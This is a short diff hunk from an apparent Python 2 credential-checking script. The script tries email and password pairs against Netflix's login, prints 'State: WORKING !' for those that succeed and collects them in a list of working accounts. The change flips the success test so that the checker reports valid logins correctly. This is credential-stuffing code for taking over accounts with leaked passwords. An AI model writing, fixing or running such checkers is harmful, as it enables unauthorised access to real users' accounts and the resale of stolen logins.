@@ -24,7 +24,7 @@ try:
 		r1 = s.get("https://www.netflix.com/browse")
 		print "Testing: " + email
 		validado = r1.text.find('Please enter a valid email')
-		if validado != -1:
+		if validado == -1:
 			print"State: WORKING !","Email: "+email+" Password: "+password + "\n"
 			workingList.append(email +':'+ password) 
 
